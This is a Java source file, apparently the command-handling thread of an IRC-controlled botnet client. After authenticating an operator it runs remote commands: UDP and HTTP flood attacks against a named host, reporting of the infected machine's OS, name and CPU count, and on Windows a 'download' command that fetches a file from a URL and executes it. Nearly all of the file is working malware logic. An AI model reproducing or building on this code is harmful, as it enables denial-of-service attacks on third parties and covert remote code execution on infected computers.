package syn.threads;

import java.io.IOException;
import java.util.ArrayList;

import syn.main.Client;
import syn.net.Flood;
import syn.net.HTTPFlood;
import syn.net.UDPFlood;
import syn.utils.Settings;
import syn.utils.Utilities;

public class CmdThread implements Runnable {

	private Utilities uc;
	private String curLine = null;
	private boolean processed = false;
	private ArrayList <String> authedUsers;
	
	public void run() {
		uc = new Utilities();
		authedUsers = new ArrayList <String> ();
		while(true) {
			try {
				Thread.sleep(100);
				if(curLine != null && !processed) {
					if(Settings.debugMode) { System.out.println(curLine); }
					try {
						initProcess(curLine);
						processed = true;
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
			} catch (Exception e) {e.printStackTrace();}
		}
	}
	
	public void setLine(String str) {
		curLine = str;
		processed = false;
	}
	
	private void initProcess(String str) throws IOException {
		if(str.startsWith("PING ")) {
			// We must respond to PINGs to avoid being disconnected.
			uc.rawwrite("PONG " + str.substring(5) + "\r\n");
		}
		if(!authedUsers.contains(uc.getUser(str)) && uc.authCheck(str)) {
			uc.write(uc.getUser(str) + " AUTHED");
			authedUsers.add(uc.getUser(str));
		}
		if(authedUsers.contains(uc.getUser(str))) { secProcess(str); }
	}
	
	private void secProcess(String str) throws IOException {
		String[] split = str.split(":");
		if(uc.isCmd(split)) {
			String cmd = uc.getCmd(split);
			//TODO: switch to modular system
			
			if(cmd.equals("die")) {
				uc.getNetworkThread().disconnect();
			
			} else if(cmd.equals("deauth")) {
				authedUsers.remove(uc.getUser(str));
				uc.write(uc.getUser(str) + " DEAUTHED");
			
			} else if(cmd.equals("mutex")) {
				uc.write(Client.getInstance().mutexStr);
			
			} else if(cmd.equals("info")) {
				uc.write("»[OS]: " + uc.procOS(Client.getInstance().os) + " | " + System.getenv("COMPUTERNAME") + "-X" + Runtime.getRuntime().availableProcessors());
			
			} else if(cmd.equals("udp")) {
				try {
					String details = uc.getCmdTxt(split);
					
					String[] hsplit = details.split(" ");
					String host = hsplit[0];
					uc.write("UDP packets targeted at " + host + ".");
					Flood.startFlood(new UDPFlood(host));
				
				} catch (Exception udpError) { uc.write("Incorrect UDP cmd usage. @udp <ip>"); }
			
			} else if(cmd.equals("http")) {
				try {
					String details = uc.getCmdTxt(split);
					String[] hsplit = details.split(" ");
					String host = hsplit[0];
					uc.write("HTTP targeted at " + host + ".");
					Flood.startFlood(new HTTPFlood(host));
				} catch (Exception httpError) { uc.write("Incorrect HTTP cmd usage: "); httpError.printStackTrace(); }
				
			} else if(cmd.equals("stopflood")) {
				uc.write("Stopping flood.");
				Flood.stopFlood();
			
			} else if(uc.procOS(Client.getInstance().os).equals("WIN")) {
				if(cmd.equals("download")) {
					if(cmd.contains(" ")) {
						String[] dsplit = uc.getCmdTxt(split).split(" ");
						String url = dsplit[0];
						String file = dsplit[1];
						Client.getInstance().fileUtils.dlExec(url, file);
					} else {
						uc.write("Download command used incorrectly.");
					}
				}
			}
		}
	}
}
